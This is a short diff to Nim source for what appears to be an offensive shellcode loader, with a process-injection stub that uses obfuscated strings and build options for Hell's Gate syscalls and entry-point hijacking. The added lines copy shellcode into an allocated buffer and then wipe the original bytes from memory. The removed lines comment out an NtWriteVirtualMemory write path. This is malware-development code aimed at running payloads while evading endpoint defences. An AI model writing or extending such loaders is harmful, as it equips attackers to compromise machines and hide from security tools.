@@ -207,6 +207,17 @@ let LocalInjectStub*  = """
 
                 
         when not defined(AllocateDripStyle):
+            when defined(verbose):
+                echo obf("[*] Writing shellcode to address: "), toHex(cast[HANDLE](buffer)), "\r\n"
+            moveMemory(buffer, unsafeAddr friendlycode, friendlycode.len)
+            # clean memory from friendlycode
+            when defined(verbose):
+                echo obf("[*] Cleaning memory")
+            var clean: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(unsafeAddr friendlycode[0], unsafeAddr clean[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[+] Memory cleaned")
+            #[
             var bytesWritten: SIZE_T
             when defined(Hellsgate):
                 var 
@@ -233,7 +244,7 @@ let LocalInjectStub*  = """
             else:
                 when defined(verbose):
                     echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
-        
+            ]#
         when defined(JmpEntry):
             var newEntry: LPVOID
             newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
